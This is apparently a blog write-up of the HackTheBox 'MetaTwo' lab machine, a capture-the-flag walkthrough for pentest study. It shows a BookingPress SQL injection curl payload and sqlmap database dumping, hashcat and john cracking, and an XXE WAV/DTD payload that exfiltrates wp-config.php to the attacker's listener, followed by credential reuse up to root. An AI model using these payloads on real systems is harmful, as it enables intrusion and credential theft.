---
title: "HackTheBox MetaTwo"
date: 2022-11-19T12:36:39+01:00
draft: false
tags: [
    "HackTheBox",
    "Pentest",
]
---

A wordpress plugin is vulnerable to unauthenticated sql injection, we exploit this to dump the database
and hashes of users. Then we can log in as manager user and we found a way to abuse the upload file
functionality to get creds for ftp. Finally for root we just need to crack a php private key.
<!--more-->


# **Introduction**

As promise I will post at least one writeup per week and some Tryhackme and CryptoHack contents is coming soon.

## **Nmap**

As always we start with the nmap scan :

```
# Nmap 7.93 scan initiated Fri Nov 18 18:47:58 2022 as: nmap -sC -sV -o nmap.txt 10.10.11.186
Nmap scan report for 10.10.11.186
Host is up (0.021s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=11/18%Time=6377C559%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
SF:e\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 18 18:51:25 2022 -- 1 IP address (1 host up) scanned in 207.94 seconds
```

Nothing special we have 3 classic ports `ftp:21`, `ssh:22` and `http:80`. Let's try ftp first.

## **FTP:21**

```
┌──(kali㉿kali)-[~/Documents/htb/box/metatwo]
└─$ ftp 10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:kali): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
ftp: Login failed
ftp>
```

As you can see anonymous login is not permitted so let's ftp away for now
and dive in http.

## **HTTP:80**

After adding `metapress.htb` to our `etc/hosts` we can access the website :

![image text](/main_page_metatwo.png)

if we click on the link : **http://metapress.htb/events/**
in the first article and then inspect the source code
we can see in the links tags that it uses bookpress plugin after searching for vulerabilities I found that the `1.0.10` version is vulnerable to `Unauthenticated SQL Injection` (more details **[here](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db235)**).

From there just I follow the POC given in wpscan's website and capture the request with burpsuite :

```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \  --data 'action=bookingpress_front_get_category_services&_wpnonce=7c71a4df9b&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080
```

Let's switch on burpsuite :

![image text](/burpsuite_capure_request_metatwo.png)

After some research the final request should looks like this :

![image text](/final_request_burp.png)

Finally just save to file the request to for_sqlmap.req for example.


## **SQLMAP**

I could perform the attack manually but to be efficient I'll use sqlmap :

```
sqlmap -r sqlinjection.req -p total_service --dbs
```
Again to save time I assume that the parameter `total_service` is vulnerable. Using the --dbs argument let us see databases name :

```
sqlmap -r forwriteup.req -p total_service --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:12:56 /2022-11-19/
...[snip]...
[15:12:57] [INFO] fetching database names
available databases [2]:
[*] blog
[*] information_schema
...[snip...]...
```
Good we know the database name let's dump tables now :

```
sqlmap -r forwriteup.req -p total_service -D blog --tables
```
We got the following output :

```
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+
```

The table that interests us is : wp_users.
After dumping it we got 2 entries :

```
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```
It's time to crack them.


## **Crack hash with Hashcat**

Unfortunatly the admin hash seems too strong to be cracked using
rockyou (It  takes too long ) but we can crack manager's hash :

```
hashcat -m 400 managerhash /usr/share/wordlists/rockyou.txt
```

Within a minute hashcat crack the hash :

```
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:party**********
```

From there I directly try these creds for ftp but without success. So what can we do ?
Remember that there is a login page in the website so let's give a try.

## **Exploit Upload plugin**

After successfully logged in we are redirected to the profile page :

![image text](/login_success.png)

I have noticed an upload page called media library, the first thing
I tried is to upload a simple php reverse shell but some filter is
blocking us from upload malicious file.

Well after looking for vulnerabilities I found out that there is **[CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447)**
that involve an XML eXternal Entity vulnerability. This vulnerability let us
upload a `malicious WAVE file` that could lead to remote arbitrary file disclosure.

By following the steps on shown on **[wpsec.com](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)** I created two files :
```
payload.wav :

echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://IP:6666/xxe.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

```
xxe.dtd

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">

<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://IP:6666/?p=%file;'>" >

```

Now I start a php http server :

```
php -S 0.0.0.0:6666
```

As you can see the payload is uploaded :

![image text](/payload_success.png)

In my terminal session I received a base64 encoded information text : 
```
[Sat Nov 19 22:51:52 2022] PHP 8.1.7 Development Server (http://0.0.0.0:6666) started
[Sat Nov 19 22:52:03 2022] 10.10.11.186:45686 Accepted
[Sat Nov 19 22:52:03 2022] 10.10.11.186:45686 [200]: GET /xxe.dtd
[Sat Nov 19 22:52:03 2022] 10.10.11.186:45686 Closing
[Sat Nov 19 22:52:03 2022] 10.10.11.186:45694 Accepted
[Sat Nov 19 22:52:03 2022] 10.10.11.186:45694 [404]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQov
...[snip]...
KiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==
```
After decoding it using **[CyberChef](https://gchq.github.io/CyberChef/)** I got the following output : 
```
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '********' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
...[snip]...
```
Great we got ftp credentials for metapress.htb user.

```
ftp 10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:kali): metapress.htb
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Dive in the emailer directory we found a php file : `send_email.php` which contains
credentials for jnelson user :

```
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;
$mail->isSMTP();

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "**********";
$mail->SMTPSecure = "tls";
$mail->Port = 587;
...[snip]...
```
Use these credentials to connect to ssh and grab the user flag :

```
jnelson@meta2:~$ cat user.txt
e629b0a5aea15********
jnelson@meta2:~$
```

## **From gpg to root**

By listing all stuff inside jnelson's home directory I noticed an
unusual hidden directory named .passpie.
**[Passpie](https://github.com/marcwebbie/passpie)** is a command line tool to manage passwords from the terminal with a colorful and configurable interface.

If we go on .passpie directory an list all files we see another hidden .key file.
The .key file contains a `PGP PUBLIC KEY BLOCK` and a `PGP PRIVATE KEY BLOCK`, of course the first idea
that came to me is to decrypt the private key with john : 

```
gpg2john pgp > for_john_pgp
john for_john_pgp --wordlist=/usr/share/wordlists/rockyou.txt
```
John gives us the password : `blink***` for this private key, what's next ?

The passpie command seems to store credentials for jnelson which we already have and for root :
```
jnelson@meta2:~$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```
From there using passpie commands I can export those credentials in a file :
```
jnelson@meta2:~$ passpie export /tmp/creds.txt
Passphrase:
jnelson@meta2:~$
```

Remember when I cracked PGP private key it gave us a password just reuse it when 
the export command asks for a passphrase and that's it.

Creds.txt file reveals us the password for root :
```
jnelson@meta2:/tmp$ cat creds.txt
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt********'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_J******'
handler: passpie
version: 1.0
```
Thanks for reading and see you next week for a new writeup.